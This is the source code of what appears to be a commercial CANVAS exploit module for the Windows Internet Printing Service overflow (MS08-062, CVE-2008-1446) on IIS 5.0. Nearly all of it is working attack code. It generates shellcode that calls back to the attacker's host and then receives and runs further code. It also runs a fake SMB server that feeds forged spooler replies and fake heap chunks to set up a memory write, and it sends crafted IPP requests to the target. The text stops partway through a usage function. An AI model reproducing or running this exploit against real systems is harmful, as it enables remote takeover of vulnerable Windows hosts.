#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import socket
import time
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
import canvasengine
import base64
from shellcode import shellcodeGenerator

# GUI info
NAME='Windows Internet Printing Service Overflow'
DESCRIPTION='Windows Internet Printing Service Overflow'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='10/14/08'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS08-062.mspx'
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name']='CVE-2008-1446'
DOCUMENTATION['CVE Url']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1446'
DOCUMENTATION['CVSS'] = 9.0
DOCUMENTATION['Notes']='This exploit will try and listen for connection on port 445/TCP. Thus it needs to be run as root under Linux, or as Administrator under Windows if SMB was disabled on all interfaces. Most of the time, /Printers/ requires credentials to access. If not, enter no login/password. If it does, we only support Basic Authentication at the moment.'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000']
PROPERTY['MSADV']='MS08-062'


README="""
"""

NOTES="""
Tested on:
Windows 2000 Professional SP4 English UP2DATE
Windows 2000 Professional SP4 English OOTB

Usage:
./commandlineInterface.py -v 1 -p 5555 -i fromcreatethread
./exploits/ms08_062/ms08_062.py -v 1 -t 10.10.10.243 -l 10.10.10.218 -d 5555
                               [-p 443 -O ssl:1]
                               [-O user:Administrator -O password:abc123]
"""

TODO="""
"""

CHANGELOG="""
"""

PRINTER_INFO_2="""
http://msdn.microsoft.com/en-us/library/ms536023(VS.85).aspx

typedef struct _PRINTER_INFO_2 {
 0  LPTSTR    pServerName;
 4  LPTSTR    pPrinterName;
 8  LPTSTR    pShareName;
 c  LPTSTR    pPortName;
10  LPTSTR    pDriverName;
14  LPTSTR    pComment;
18  LPTSTR    pLocation;
1c  LPDEVMODE pDevMode;
20  LPTSTR    pSepFile;
24  LPTSTR    pPrintProcessor;
28  LPTSTR    pDatatype;
2c  LPTSTR    pParameters;
30  PSECURITY_DESCRIPTOR pSecurityDescriptor;
34  DWORD     Attributes;
38  DWORD     Priority;
3c  DWORD     DefaultPriority;
40  DWORD     StartTime;
44  DWORD     UntilTime;
48  DWORD     Status;
4c  DWORD     cJobs;
50  DWORD     AveragePPM;
} PRINTER_INFO_2, *PPRINTER_INFO_2; 
"""

JOB_INFO_2="""
http://msdn.microsoft.com/en-us/library/ms535671(VS.85).aspx

typedef struct _JOB_INFO_2 {
  DWORD      JobId;
  LPTSTR     pPrinterName;
  LPTSTR     pMachineName;
  LPTSTR     pUserName;
  LPTSTR     pDocument;
  LPTSTR     pNotifyName;
  LPTSTR     pDatatype;
  LPTSTR     pPrintProcessor;
  LPTSTR     pParameters;
  LPTSTR     pDriverName;
  LPDEVMODE  pDevMode;
  LPTSTR     pStatus;
  PSECURITY_DESCRIPTOR pSecurityDescriptor;
  DWORD      Status;
  DWORD      Priority;
  DWORD      Position;
  DWORD      StartTime;
  DWORD      UntilTime;
  DWORD      TotalPages;
  DWORD      Size;
  SYSTEMTIME Submitted;
  DWORD      Time;
  DWORD      PagesPrinted;
} JOB_INFO_2, *PJOB_INFO_2;
"""

VERSION='1.0'

targets={
    0:['Autodetect (N/A)',0x00000000],
    1:['IIS 5.0 on Windows 2000',0x00230000]
}


def toUnicode(ss):
    sss=''
    for c in ss:
        sss+=c+'\0'
    return sss

def encodeString(ss):
    return struct.pack('>H',len(ss))+ss

def getLookasideEntryAddress(base,size):
    size+=0x0f
    size&=0xfffffff8L
    size=size>>3
    address=size*0x30
    address+=0x688
    address+=base
    return address

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.host=''
        self.port=80
        self.badstring='\0\xff'
        self.ssl=0
        self.user=''
        self.password=''
        self.listenerArgsDict['fromcreatethread']=1
        self.heapbase=0x00230000
        self.entrysize=0x300 #this should be big enough to hold the shellcode and ideally no other chunks of that size are used in the program
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        sc=shellcodeGenerator.win32()
        sc.addAttr('findeipnoesp',None)
        sc.addAttr('Fix RtlEnterCriticalSection',{'SimpleFix':1})
        sc.addAttr('revert_to_self_before_importing_ws2_32',None)
        sc.addAttr('tcpconnect',{'port':self.callback.port,'ipaddress':self.callback.ip})
        sc.addAttr('CreateThreadRecvExecWin32',{'socketreg':'FDSPOT'}) #MOSDEF
        sc.addAttr('ExitThread',None)
        rawsc=sc.get()
        self.shellcode=self.intel_encode(self.badstring,rawsc)
        if len(self.shellcode)%2!=0:
            self.shellcode+='P'
        return self.shellcode

    def loghexdump(self,d):
        log=''
        for i in range(0,len(d)):
            if i and (i%8)==0:
                log+='\n'
            log+='%02x '%(ord(d[i]))
        log+='\n'
        self.log(log)
        return

    def recvall(self,s):
        data=s.recv(4)
        if len(data)<4: #should never happen
            return ''
        data+=s.recv((struct.unpack('>L',data)[0])&0x00ffffff) #only 3 bytes
        return data

    def buildIPPbody(self,includeShellcode=False):
        """Builds the IPP body part of the HTTP request"""
        body=''
        body+=struct.pack('>HHL',0x0100,0x000a,0x00000001) # 0xa is Get-Jobs (cf. RFC2911)
        body+=struct.pack('>B',0x01)
        body+=struct.pack('>B',0x47) #charsets
        body+=encodeString('attributes-charset')
        body+=encodeString('utf-8')
        body+=struct.pack('>B',0x48) #naturalLanguage
        body+=encodeString('attributes-natural-language')
        body+=encodeString('en-us')
        body+=struct.pack('>B',0x45) #uri
        body+=encodeString('printer-uri')
        body+=encodeString('http://10.10.10.1/printers/Epson')
        if includeShellcode==True:
            body+=struct.pack('>B',0x36) #nameWithLanguage
            body+=encodeString('shellcode')
            sc=''
            sc+='AA' #overwritten on free to lookaside
            sc+=UTF16toUTF8('\xeb\x06') #jump over
            sc+='BBB' #overwritten on write4
            sc+=UTF16toUTF8(self.shellcode)
            sc+='B'*((self.entrysize-len(self.shellcode))/2-0x06) #padding to reach wanted entry size
            body+=encodeString(encodeString('en-us')+encodeString(sc))
        body+=struct.pack('>B',0x03) #end-of-attributes-tag
        return body

    def handleSMBclient(self,s,what,where):
        """Handles a SMB client connection"""
        request=self.recvall(s)
        #Negotiate Protocol Request
        if len(request)<9 or request[4:8]!='\xffSMB' or ord(request[8])!=0x72:
            self.log('Unexpected packet received instead of "Negotiate Protocol Request"')
            return False
        muxid=struct.unpack('<H',request[0x22:0x24])[0]
        #Negotiate Protocol Response
        response=''
        response+=struct.pack('>BBH',0x00,0x00,0x0055)+'\xffSMB'+struct.pack('<BL',0x72,0x00000000)
        response+=struct.pack('<BHH',0x98,0xc853,0x0000)+'\0'*0x08
        response+=struct.pack('<HHHHH',0x0000,0x0000,0xfeff,0x0000,muxid)
        response+=struct.pack('<BHBHHLLL',0x11,0x0005,0x03,0x000a,0x0001,0x00001104,0x00010000,0x00000000)
        response+=struct.pack('<LLLHBH',0x8000e3fd,0x00000000,0x00000000,0x0168,0x00,0x0010)+'\xff'*0x10
        s.sendall(response)
        request=self.recvall(s)
        #Session Setup AndX Request, NTLMSSP_NEGOTIATE
        if len(request)<0x24 or request[4:8]!='\xffSMB' or ord(request[8])!=0x73:
            self.log('Unexpected packet received instead of "Session Setup AndX Request, NTLMSSP_NEGOTIATE"')
            return False
        muxid=struct.unpack('<H',request[0x22:0x24])[0]
        #Session Setup AndX Response, NTLMSSP_CHALLENGE, Error: STATUS_MORE_PROCESSING_REQUIRED
        response=''
        response+=struct.pack('>BBH',0x00,0x00,0x011d)+'\xffSMB'+struct.pack('<BL',0x73,0xc0000016)
        response+=struct.pack('<BHH',0x98,0xc807,0x0000)+'\0'*0x08
        response+=struct.pack('<HHHHH',0x0000,0x0000,0xfeff,0x0800,muxid)
        response+=struct.pack('<BBBHH',0x04,0xff,0x00,0x011d,0x0000)
        response+=struct.pack('<HH',0x00a8,0x00f2)+'NTLMSSP\0'+struct.pack('<L',0x00000002)
        response+=struct.pack('<HHL',0x0014,0x0014,0x00000030)+struct.pack('<L',0xe08a8215)+'\0'*16
        response+=struct.pack('<HHL',0x0064,0x0064,0x00000044)+toUnicode('FAKESMBSRV')
        response+=struct.pack('<HH',0x0002,0x0014)+toUnicode('FAKESMBSRV')
        response+=struct.pack('<HH',0x0001,0x0014)+toUnicode('FAKESMBSRV')
        response+=struct.pack('<HH',0x0004,0x0014)+toUnicode('fakesmbsrv')
        response+=struct.pack('<HH',0x0003,0x0014)+toUnicode('fakesmbsrv')
        response+=struct.pack('<L',0x00000000)
        if len(response)%2!=0:
            response+='\0'
        response+=toUnicode('Windows 5.0')+'\0\0'
        response+=toUnicode('Windows 2000 LAN Manager')+'\0'
        s.sendall(response)
        request=self.recvall(s)
        #Session Setup AndX Request, NTLMSSP_AUTH, User: ???
        if len(request)<0x24 or request[4:8]!='\xffSMB' or ord(request[8])!=0x73:
            self.log('Unexpected packet received instead of "Session Setup AndX Request, NTLMSSP_AUTH, User: ???"')
            return
        muxid=struct.unpack('<H',request[0x22:0x24])[0]
        #Session Setup AndX Response
        response=''
        response+=struct.pack('>BBH',0x00,0x00,0x0075)+'\xffSMB'+struct.pack('<BL',0x73,0x00000000)
        response+=struct.pack('<BHH',0x98,0xc807,0x0000)+'\0'*0x08
        response+=struct.pack('<HHHHH',0x0000,0x0000,0xfeff,0x0800,muxid) #tid pid uid
        response+=struct.pack('<BBBH',0x04,0xff,0x00,0x0075)
        response+=struct.pack('<HHHB',0x0000,0x0000,0x004a,0x4e)
        response+=toUnicode('Windows 5.0')+'\0\0'
        response+=toUnicode('Windows 2000 LAN Manager')+'\0'
        s.sendall(response)
        request=self.recvall(s)
        #Tree Connect AndX Request, Path: ???
        if len(request)<0x24 or request[4:8]!='\xffSMB' or ord(request[8])!=0x75:
            self.log('Unexpected packet received instead of "Tree Connect AndX Request, Path: ???"')
            return False
        muxid=struct.unpack('<H',request[0x22:0x24])[0]
        #Tree Connect AndX Response
        response=''
        response+=struct.pack('>BBH',0x00,0x00,0x0038)+'\xffSMB'+struct.pack('<BL',0x75,0x00000000)
        response+=struct.pack('<BHH',0x98,0xc807,0x0000)+'\0'*0x08
        response+=struct.pack('<HHHHH',0x0000,0x0800,0xfeff,0x0800,muxid) #tid pid uid
        response+=struct.pack('<BBBH',0x07,0xff,0x00,0x0038)
        response+=struct.pack('<HHHHHH',0x0001,0x01ff,0x0000,0x01ff,0x0000,0x0007)+'IPC'+'\0'*4
        s.sendall(response)
        request=self.recvall(s)
        #NT Create AndX Request, Path: \spoolss
        if len(request)<0x24 or request[4:8]!='\xffSMB' or ord(request[8])!=0xa2:
            self.log('Unexpected packet received')
            return False
        muxid=struct.unpack('<H',request[0x22:0x24])[0]
        #NT Create AndX Response, FID: 0x4000
        response=''
        response+=struct.pack('>BBH',0x00,0x00,0x0087)+'\xffSMB'+struct.pack('<BL',0xa2,0x00000000)
        response+=struct.pack('<BHH',0x98,0xc807,0x0000)+'\0'*0x08
        response+=struct.pack('<HHHHH',0x0000,0x0800,0x01a4,0x0800,muxid) #tid pid uid
        response+=struct.pack('<BBBH',0x2a,0xff,0x00,0x0087)
        response+=struct.pack('<BHL',0x00,0x4000,0x00000001)+'\0'*32 #fid
        response+=struct.pack('<LLL',0x00000080,0x00001000,0x00000000)+'\0'*8
        response+=struct.pack('<HHBH',0x0002,0x05ff,0x00,0x0000)
        response+=struct.pack('<HHL',0x0014,0x0014,0x00000076)
        response+=struct.pack('<HHL',0x0010,0x0010,0x000000ba)
        response+=struct.pack('<LHHHHHH',0xe2888215,0x0005,0x01ff,0x001f,0x01fb,0x0012,0x004f) #unknown
        s.sendall(response)
        request=self.recvall(s)
        #DCERPC Bind: call_id: 1 SPOOLSS V1.0
        if len(request)<0x68 or request[4:8]!='\xffSMB' or ord(request[8])!=0x25:
            self.log('Unexpected packet received instead of "DCERPC Bind: call_id: 1 SPOOLSS V1.0"')
            return False
        callid=struct.unpack('<L',request[0x64:0x68])[0]
        pid=struct.unpack('<H',request[0x1e:0x20])[0]
        muxid=struct.unpack('<H',request[0x22:0x24])[0]
        #DCERPC Bind_ack: call_id: 1 accept max_xmit: 4280 max_recv: 4280
        response=''
        response+=struct.pack('>BBH',0x00,0x00,0x007c)+'\xffSMB'+struct.pack('<BL',0x25,0x00000000)
        response+=struct.pack('<BHH',0x98,0xc807,0x0000)+'\0'*0x08
        response+=struct.pack('<HHHHH',0x0000,0x0800,pid,0x0800,muxid) #tid pid uid
        response+=struct.pack('<BHHHHHHHHHBBHB',0x0a,0x0000,0x0044,0x0000,0x0000,0x0038,0x0000,0x0044,0x0038,0x0000,0x00,0x00,0x0045,0x00)
        response+=struct.pack('<BBBBLHHLHH',0x05,0x00,0x0c,0x03,0x00000010,0x0044,0x0000,callid,0x10b8,0x10b8)
        response+=struct.pack('<LH',0x00003b55,0x000e)+'\\pipe\\spoolss\0'+struct.pack('<LL',0x00000001,0x00000000)
        response+=struct.pack('<LHHBBBBBBBBL',0x8a885d04,0x1ceb,0x11c9,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60,0x00000002)
        s.sendall(response)
        request=self.recvall(s)
        #SPOOLSS OpenPrinterEx request, \\???\Epson
        if len(request)<0x68 or request[4:8]!='\xffSMB' or ord(request[8])!=0x25:
            self.log('Unexpected packet received instead of "SPOOLSS OpenPrinterEx request, \\???\Epson"')
            return False
        callid=struct.unpack('<L',request[0x64:0x68])[0]
        pid=struct.unpack('<H',request[0x1e:0x20])[0]
        muxid=struct.unpack('<H',request[0x22:0x24])[0]
        #SPOOLSS OpenPrinterEx response
        data=''
        data+='\xff'*0x14+struct.pack('<L',0x00000000) #context
        response=''
        response+=struct.pack('>BBH',0x00,0x00,0x0050+len(data))+'\xffSMB'+struct.pack('<BL',0x25,0x00000000)
        response+=struct.pack('<BHH',0x98,0xc807,0x0000)+'\0'*0x08
        response+=struct.pack('<HHHHH',0x0000,0x0800,pid,0x0800,muxid) #tid pid uid
        response+=struct.pack('<BHHHHHHHHHBBHB',0x0a,0x0000,0x0018+len(data),0x0000,0x0000,0x0038,0x0000,0x0018+len(data),0x0038,0x0000,0x00,0x00,0x18+len(data)+1,0x00)
        response+=struct.pack('<BBBBLHHLL',0x05,0x00,0x02,0x03,0x00000010,0x18+len(data),0x0000,callid,len(data))
        response+=struct.pack('<HH',0x0000,0x0000)
        response+=data
        s.sendall(response)
        request=self.recvall(s)
        #SPOOLSS GetPrinter request, level 2
        if len(request)<0x68 or request[4:8]!='\xffSMB' or ord(request[8])!=0x25:
            self.log('Unexpected packet received instead of "SPOOLSS GetPrinter request, level 2"')
            return False
        callid=struct.unpack('<L',request[0x64:0x68])[0]
        pid=struct.unpack('<H',request[0x1e:0x20])[0]
        muxid=struct.unpack('<H',request[0x22:0x24])[0]
        #SPOOLSS GetPrinter response, Insufficient buffer
        data=''
        data+=struct.pack('<LLL',0x00000000,0x00000054,0x0000007a)
        response=''
        response+=struct.pack('>BBH',0x00,0x00,0x0050+len(data))+'\xffSMB'+struct.pack('<BL',0x25,0x00000000)
        response+=struct.pack('<BHH',0x98,0xc807,0x0000)+'\0'*0x08
        response+=struct.pack('<HHHHH',0x0000,0x0800,pid,0x0800,muxid) #tid pid uid
        response+=struct.pack('<BHHHHHHHHHBBHB',0x0a,0x0000,0x0018+len(data),0x0000,0x0000,0x0038,0x0000,0x0018+len(data),0x0038,0x0000,0x00,0x00,0x0018+len(data)+1,0x00)
        response+=struct.pack('<BBBBLHHLL',0x05,0x00,0x02,0x03,0x00000010,0x0018+len(data),0x0000,callid,len(data))
        response+=struct.pack('<HH',0x0000,0x0000)
        response+=data
        s.sendall(response)
        request=self.recvall(s)
        #SPOOLSS GetPrinter request, level 2
        if len(request)<0x68 or request[4:8]!='\xffSMB' or ord(request[8])!=0x25:
            self.log('Unexpected packet received instead of "SPOOLSS GetPrinter request, level 2"')
            return False
        callid=struct.unpack('<L',request[0x64:0x68])[0]
        pid=struct.unpack('<H',request[0x1e:0x20])[0]
        muxid=struct.unpack('<H',request[0x22:0x24])[0]
        #SPOOLSS GetPrinter response
        data=''
        #PRINTER_INFO_2 buffer, needs Attributes&8!=0, read structure definition at the top
        #Status is 'Toner Low' cause our printers suck
        data+=struct.pack('<L',0x00000000)*0x0d
        data+=struct.pack('<LLLLLLLL',0x00000248,0x00000001,0x00000000,0x00000000,0x00000000,0x00020000,0x00000000,0x00000000)
        size=len(data)
        data=struct.pack('<LL',0x00000001,size)+data+struct.pack('<LL',size,0x00000000)
        response=''
        response+=struct.pack('>BBH',0x00,0x00,0x0050+len(data))+'\xffSMB'+struct.pack('<BL',0x25,0x00000000)
        response+=struct.pack('<BHH',0x98,0xc807,0x0000)+'\0'*0x08
        response+=struct.pack('<HHHHH',0x0000,0x0800,pid,0x0800,muxid) #tid pid uid
        response+=struct.pack('<BHHHHHHHHHBBHB',0x0a,0x0000,0x0018+len(data),0x0000,0x0000,0x0038,0x0000,0x0018+len(data),0x0038,0x0000,0x00,0x00,0x18+len(data)+1,0x00)
        response+=struct.pack('<BBBBLHHLL',0x05,0x00,0x02,0x03,0x00000010,0x0018+len(data),0x0000,callid,len(data))
        response+=struct.pack('<HH',0x0000,0x0000)
        response+=data
        s.sendall(response)
        request=self.recvall(s)
        #SPOOLSS EnumJobs request, level 2
        if len(request)<0x68 or request[4:8]!='\xffSMB' or ord(request[8])!=0x25:
            self.log('Unexpected packet received instead of "SPOOLSS EnumJobs request, level 2"')
            return False
        callid=struct.unpack('<L',request[0x64:0x68])[0]
        pid=struct.unpack('<H',request[0x1e:0x20])[0]
        muxid=struct.unpack('<H',request[0x22:0x24])[0]
        #SPOOLSS EnumJobs response, Insufficient buffer
        #JOB_INFO_2 structure is built here to know how many bytes must be returned in pcbNeededs
        jobinfo=''
        jobinfo+=struct.pack('<L',0x00000001) #jobid
        jobinfo+=struct.pack('<L',0x00000000)*0x0c
        jobinfo+=struct.pack('<LLLLLLL',0x00000010,0x00000001,0x00000001,0x00000000,0x00000000,0x00000000,0x00000010)
        jobinfo+='\0'*0x14+struct.pack('<L',0x00000001)
        #Fake heap chunks start here
        jobinfo=jobinfo[:0x04]+struct.pack('<L',len(jobinfo))+jobinfo[0x08:]
        jobinfo+=struct.pack('<HHBBBB',0x0002,0x0002,0x01,0x01,0x08,0x00)
        jobinfo+='A'*8
        jobinfo+=struct.pack('<HHBBBB',0x0081,0x0002,0x01,0x01,0x08,0x00)
        jobinfo+='A'*1024
        jobinfo+=struct.pack('<HHBBBB',0x0004,0x0081,0x01,0x00,0x08,0x00)
        jobinfo+=struct.pack('<LL',what,where) #what,where
        jobinfo+='\0\0'
        if len(jobinfo)%4!=0:
            jobinfo+='\0'*(4-(len(jobinfo)%4))
        #Actual response starts here
        data=''
        data+=struct.pack('<LLLL',0x00000000,len(jobinfo),0x00000000,0x0000007a)
        response=''
        response+=struct.pack('>BBH',0x00,0x00,0x0050+len(data))+'\xffSMB'+struct.pack('<BL',0x25,0x00000000)
        response+=struct.pack('<BHH',0x98,0xc807,0x0000)+'\0'*0x08
        response+=struct.pack('<HHHHH',0x0000,0x0800,pid,0x0800,muxid) #tid pid uid
        response+=struct.pack('<BHHHHHHHHHBBHB',0x0a,0x0000,0x0018+len(data),0x0000,0x0000,0x0038,0x0000,0x0018+len(data),0x0038,0x0000,0x00,0x00,0x0018+len(data)+1,0x00)
        response+=struct.pack('<BBBBLHHLL',0x05,0x00,0x02,0x03,0x00000010,0x0018+len(data),0x0000,callid,len(data))
        response+=struct.pack('<HH',0x0000,0x0000)
        response+=data
        s.sendall(response)
        request=self.recvall(s)
        #SPOOLSS EnumJobs request, level 2
        if len(request)<0x68 or request[4:8]!='\xffSMB' or ord(request[8])!=0x25:
            self.log('Unexpected packet received instead of "SPOOLSS EnumJobs request, level 2"')
            return False
        callid=struct.unpack('<L',request[0x64:0x68])[0]
        pid=struct.unpack('<H',request[0x1e:0x20])[0]
        muxid=struct.unpack('<H',request[0x22:0x24])[0]
        #SPOOLSS EnumJobs response (split in 2 fragments)
        #SMB Pipe TransactNmPipe Response, FID: 0x4000
        data=''
        data+=jobinfo
        size=len(data)
        data=struct.pack('<LL',0x00000001,size)+data+struct.pack('<LLL',0x000003fe,0x00000001,0x00000000)
        self.log('Sending 1st fragment of EnumJobs response')
        #Fragment 1
        response=''
        response+=struct.pack('>BBH',0x00,0x00,0x0438)+'\xffSMB'+struct.pack('<BL',0x25,0x80000005)
        response+=struct.pack('<BHH',0x98,0xc807,0x0000)+'\0'*0x08
        response+=struct.pack('<HHHHH',0x0000,0x0800,pid,0x0800,muxid) #tid pid uid
        response+=struct.pack('<BHHHHHHHHHBBHB',0x0a,0x0000,0x0400,0x0000,0x0000,0x0038,0x0000,0x0400,0x0038,0x0000,0x00,0x00,0x0401,0x00)
        response+=struct.pack('<BBBBLHHLL',0x05,0x00,0x02,0x03,0x00000010,0x0018+len(data),0x0000,callid,len(data))
        response+=struct.pack('<HH',0x0000,0x0000)
        response+=data[:0x400-0x18]
        s.sendall(response)
        request=self.recvall(s)
        #SMB Read AndX Request, FID: 0x4000, ??? bytes at offset 0
        if len(request)<0x24 or request[4:8]!='\xffSMB' or ord(request[8])!=0x2e:
            self.log('Unexpected packet received instead of "SMB Read AndX Request, FID: 0x4000, ??? bytes at offset 0"')
            return False
        pid=struct.unpack('<H',request[0x1e:0x20])[0]
        muxid=struct.unpack('<H',request[0x22:0x24])[0]
        # XXX
        self.log('Sending 2nd fragment of EnumJobs response')
        #Fragment 2
        remaining=data[0x400-0x18:]
        response=''
        response+=struct.pack('>BBH',0x00,0x00,0x48+len(remaining))+'\xffSMB'+struct.pack('<BL',0x2e,0x00000000)
        response+=struct.pack('<BHH',0x98,0xc807,0x0000)+'\0'*0x08
        response+=struct.pack('<HHHHH',0x0000,0x0800,pid,0x0800,muxid) #tid pid uid
        response+=struct.pack('<BBBHHHHHHL',0x0c,0xff,0x00,0x0000,0x0000,0x0000,0x0000,len(remaining),0x003c,0x00000000)
        response+='\0'*6+struct.pack('<HB',len(remaining)+1,0x00)
        response+=data[0x400-0x18:]
        s.sendall(response)
        '''
        request=self.recvall(s)
        #SPOOLSS ClosePrinter request, OpenPrinterEx(\\???\Epson)
        if len(request)<0x68 or request[4:8]!='\xffSMB' or ord(request[8])!=0x25:
            self.log('Unexpected packet received instead of "SPOOLSS ClosePrinter request, OpenPrinterEx(\\???\Epson)"')
            return False
        callid=struct.unpack('<L',request[0x64:0x68])[0]
        pid=struct.unpack('<H',request[0x1e:0x20])[0]
        muxid=struct.unpack('<H',request[0x22:0x24])[0]
        #SPOOLSS ClosePrinter response
        data=''
        data+='\0'*0x14+struct.pack('<L',0x00000000) #context
        response=''
        response+=struct.pack('>BBH',0x00,0x00,0x0050+len(data))+'\xffSMB'+struct.pack('<BL',0x25,0x00000000)
        response+=struct.pack('<BHH',0x98,0xc807,0x0000)+'\0'*0x08
        response+=struct.pack('<HHHHH',0x0000,0x0800,pid,0x0800,muxid) #tid pid uid
        response+=struct.pack('<BHHHHHHHHHBBHB',0x0a,0x0000,0x0018+len(data),0x0000,0x0000,0x0038,0x0000,0x0018+len(data),0x0038,0x0000,0x00,0x00,0x18+len(data)+1,0x00)
        response+=struct.pack('<BBBBLHHLL',0x05,0x00,0x02,0x03,0x00000010,0x18+len(data),0x0000,callid,len(data))
        response+=struct.pack('<HH',0x0000,0x0000)
        response+=data
        s.sendall(response)
        request=self.recvall(s)
        #SMB Close Request, FID: 0x4000
        if len(request)<0x24 or request[4:8]!='\xffSMB' or ord(request[8])!=0x04:
            self.log('Unexpected packet received instead of "SMB Close Request, FID: 0x4000"')
            return False
        pid=struct.unpack('<H',request[0x1e:0x20])[0]
        muxid=struct.unpack('<H',request[0x22:0x24])[0]
        #SMB Close Response, FID: 0x4000
        response=''
        response+=struct.pack('>BBH',0x00,0x00,0x23)+'\xffSMB'+struct.pack('<BL',0x04,0x00000000)
        response+=struct.pack('<BHH',0x98,0xc807,0x0000)+'\0'*0x08
        response+=struct.pack('<HHHHH',0x0000,0x0800,pid,0x0800,muxid) #tid pid uid
        response+=struct.pack('<BH',0x00,0x0000)
        s.sendall(response)
        request=self.recvall(s)
        #SMB Logoff AndX Request
        if len(request)<0x24 or request[4:8]!='\xffSMB' or ord(request[8])!=0x74:
            self.log('Unexpected packet received instead of "SMB Logoff AndX Request"')
            return False
        pid=struct.unpack('<H',request[0x1e:0x20])[0]
        muxid=struct.unpack('<H',request[0x22:0x24])[0]
        #SMB Logoff AndX Response
        response=''
        response+=struct.pack('>BBH',0x00,0x00,0x27)+'\xffSMB'+struct.pack('<BL',0x74,0x00000000)
        response+=struct.pack('<BHH',0x98,0xc807,0x0000)+'\0'*0x08
        response+=struct.pack('<HHHHHBH',0x0000,0x0000,pid,0x0800,muxid) #tid pid uid
        response+=struct.pack('<BBBHH',0x02,0xff,0x00,0x0027,0x0000)
        s.sendall(response)
        request=self.recvall(s)
        #SMB Tree Disconnect Request
        if len(request)<0x24 or request[4:8]!='\xffSMB' or ord(request[8])!=0x71:
            self.log('Unexpected packet received instead of "SMB Logoff AndX Request"')
            return False
        pid=struct.unpack('<H',request[0x1e:0x20])[0]
        muxid=struct.unpack('<H',request[0x22:0x24])[0]
        #SMB Tree Disconnect Response
        response=''
        response+=struct.pack('>BBH',0x00,0x00,0x23)+'\xffSMB'+struct.pack('<BL',0x71,0x00000000)
        response+=struct.pack('<BHH',0x98,0xc807,0x0000)+'\0'*0x08
        response+=struct.pack('<HHHHHBH',0x0000,0x0000,pid,0x0800,muxid) #tid pid uid
        response+=struct.pack('<BH',0x00,0x0000)
        s.sendall(response)
        '''
        return True

    def IPPexploit(self,what,where,includeShellcode=False):
        """Sends the IPP request and call for the client connection handler"""
        smb_s=self.gettcpsock()
        smb_s.set_timeout(15) #15 seconds timeout on accept/recv
        smb_s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        try:
            smb_s.bind(('',445))
        except socket.error,err:
            self.log("Couldn't bind on port 445/tcp: %s"%(err))
            return False
        smb_s.listen(1)
        self.log('Fake SMB server successfully started!')

        body=self.buildIPPbody(includeShellcode)
        head=''
        head+='POST /printers/~5c~5c%s~5cEpson/.printer?IPP HTTP/1.1'%(self.callback.ip)+'\r\n'
        head+='Host: %s'%(self.host)+'\r\n'
        head+='Content-Length: %d'%(len(body))+'\r\n'
        #head+='Content-type: application/x-www-form-urlencoded'+'\r\n'
        if self.user!='':
            head+='Authorization: Basic %s'%(base64.b64encode(self.user+':'+self.password))+'\r\n'
        head+='Connection: keep-alive'+'\r\n'
        head+='Accept: text/plain'+'\r\n'
        head+='\r\n'
        http_s=self.gettcpsock()
        try:
            http_s.connect((self.host,self.port))
        except:
            self.log('Could not connect to port %s:%s'%(self.host,self.port))
            return False
        self.log('Connected to target')
        self.websend(http_s,head)
        data=self.webrecv(http_s)
        #IIS does a Continue after the headers and before the body
        if data.find('HTTP/1.1 100 Continue')==-1:
            self.log("The HTTP server didn't like our request (Authentication required?)")
            return False
        self.websend(http_s,body)

        c,address=smb_s.accept()
        self.log('Got new connection from %s:%d'%(address))
        success=True
        if self.handleSMBclient(c,what,where)!=True:
            self.log('Some error occured when handling the client connection')
            success=False
        c.close()
        smb_s.close()
        data=self.webrecv(http_s) #empty what's left
        time.sleep(2)
        return success

    def getargs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        self.user=self.argsDict.get('user',self.user)
        self.password=self.argsDict.get('password',self.password)
        self.ssl=int(self.argsDict.get('ssl',self.ssl))
        return

    def test(self):
        self.getargs()
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect to port %s:%s'%(self.host,self.port))
            return 0
        self.log('Connected to target')
        request=''
        request+='GET /printers/ HTTP/1.1\r\n'
        request+='Host: %s\r\n'%(self.host)
        request+='\r\n'
        self.websend(s,request)
        data=self.webrecv(s)
        s.close()
        if data.find('HTTP/1.1 200 OK')!=-1:
            self.log('Directory can be accessed and requires no authentication')
            return 1
        elif data.find('HTTP/1.1 401 Access Denied')!=-1:
            self.log('Directory can be accessed but requires authentication')
            return 1
        self.log('Directory cannot be accessed')
        return 0

    def run(self):
        self.getargs()
        self.setInfo('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        self.log('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        if self.version==0:
            self.log('Autoversioning not available')
            return 0
        self.info,self.heapbase=targets[self.version]
        address=getLookasideEntryAddress(self.heapbase,self.entrysize+0x10)
        self.log('Using Lookaside entry address 0x%08x'%(address))
        if self.IPPexploit(0x7ffdf7fc,address,includeShellcode=True)==False:
            self.log('The 1st IPP request failed')
            return 0
        if self.IPPexploit(0x7ffdf800,0x7ffdf020,includeShellcode=True)==False:
            self.log('The 2nd IPP request failed')
            return 0
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect to port %s:%s'%(self.host,self.port))
            return 0
        self.log('Connected to target')
        request=''
        request+='GET / HTTP/1.1\r\n'
        request+='Host: %s\r\n'%(self.host)
        request+='\r\n'
        self.websend(s,request)
        time.sleep(2)

        if self.ISucceeded():
            return 1
        return 0

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i=i+1

    def usage(self):
